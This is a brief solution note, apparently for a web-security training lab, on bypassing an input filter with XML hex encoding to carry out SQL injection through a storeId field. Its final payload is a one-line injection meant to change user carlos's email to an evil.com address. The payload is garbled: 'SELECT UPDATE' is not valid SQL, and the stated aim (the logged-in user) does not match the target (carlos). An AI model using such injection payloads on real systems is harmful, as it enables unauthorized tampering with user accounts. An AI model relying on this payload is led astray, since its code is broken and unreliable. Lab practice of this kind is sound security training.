# Lab 16: SQL Injection with Filter Bypass via XML Encoding

* **Solution**: Encode an UPDATE query in XML hex (&#x53; for “S”) within the storeId field to change the logged-in user’s email.
* **Final Payload**:
  * <storeId>1 &#x53;ELECT UPDATE users SET email='hacked@evil.com' WHERE username='carlos'</storeId>
